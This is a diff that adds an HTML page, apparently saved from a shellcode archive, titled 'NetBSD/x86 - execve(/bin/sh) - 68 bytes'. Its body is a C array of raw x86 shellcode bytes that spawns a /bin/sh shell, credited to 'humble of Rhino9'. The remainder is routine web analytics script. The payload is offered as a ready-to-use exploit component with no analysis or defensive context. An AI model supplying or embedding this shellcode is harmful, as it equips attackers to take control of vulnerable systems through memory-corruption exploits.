@@ -1,0 +1,49 @@
+<html idmmzcc-ext-docid="326207488"><head><title>NetBSD/x86 - execve(/bin/sh) - 68 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Language" content="en">
+</head>
+
+
+<body><pre>/*
+ *  NetBSD
+ *  execve() of /bin/sh by humble of Rhino9
+ */
+
+char shellcode[] =
+  "\xeb\x23"
+  "\x5e"
+  "\x8d\x1e"
+  "\x89\x5e\x0b"
+  "\x31\xd2"
+  "\x89\x56\x07"
+  "\x89\x56\x0f"
+  "\x89\x56\x14"
+  "\x88\x56\x19"
+  "\x31\xc0"
+  "\xb0\x3b"
+  "\x8d\x4e\x0b"
+  "\x89\xca"
+  "\x52"
+  "\x51"
+  "\x53"
+  "\x50"
+  "\xeb\x18"
+  "\xe8\xd8\xff\xff\xff"
+  "/bin/sh"
+  "\x01\x01\x01\x01"
+  "\x02\x02\x02\x02"
+  "\x03\x03\x03\x03"
+  "\x9a\x04\x04\x04\x04\x07\x04";
+
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
+</script><script src="NetBSD_x86%20-%20execve%28_bin_sh%29%20-%2068%20bytes_files/ga.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-6809519-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</pre></body></html>
